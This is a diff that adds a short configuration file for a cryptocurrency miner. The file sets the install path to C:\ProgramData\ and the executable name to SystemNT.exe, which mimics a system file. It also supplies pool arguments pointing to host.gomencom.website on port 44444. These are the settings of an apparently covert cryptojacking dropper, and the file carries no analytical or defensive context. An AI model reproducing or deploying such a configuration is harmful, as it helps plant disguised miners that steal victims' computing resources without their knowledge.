@@ -1,0 +1,4 @@
+﻿
+Miner_dir = C:\ProgramData\
+Miner_name = SystemNT.exe
+Miner_key = -o host.gomencom.website:44444 -u  XXX  -p x --donate-level=1 --api-port=1010
